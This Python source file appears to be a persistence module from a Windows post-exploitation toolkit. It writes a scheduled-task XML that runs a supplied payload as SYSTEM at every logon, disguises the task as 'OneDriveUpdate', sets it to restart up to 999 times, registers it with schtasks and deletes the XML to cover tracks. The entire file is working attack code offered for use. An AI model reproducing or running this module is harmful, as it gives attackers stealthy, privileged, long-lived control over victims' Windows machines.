import os
import time
import tempfile
from core.prints import *
from core.utils import *

schtask_info = {
        "Description": "Gain persistence with system privilege using schtasks",
		"Id" : "17",
		"Type" : "Persistence",	
		"Fixed In" : "99999",
		"Works From" : "7600",
		"Admin" : True,
		"Function Name" : "schtask",
		"Function Payload" : True,
    }

def schtask(payload):
	if (payloads().exe(payload) == True):
		xml_template = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2018-06-09T15:45:11.0109885</Date>
    <Author>000000000000000000</Author>
    <URI>\Microsoft\Windows\OneDriveUpdate</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT2H</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"""+os.path.join(payload)+"""</Command>
    </Exec>
  </Actions>
</Task>"""

		if (information().admin() == True):
			try:
				xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
				xml_file.write(xml_template)
				xml_file.close()
			except Exception as error:
				return False
		
			time.sleep(5)
		
			if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
				if process().create("schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),0) == True:
					print_success("Successfully created scheduled task, payload will run at login")
				else:
					print_error("Unable to create scheduled task")	
					return False
					
				time.sleep(5)

				try:
					os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
				except Exception as error:
					return False
			else:
				print_error("Unable to create scheduled task, xml file not found")
				return False
		else:
			print_error("Cannot proceed, we are not elevated")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False							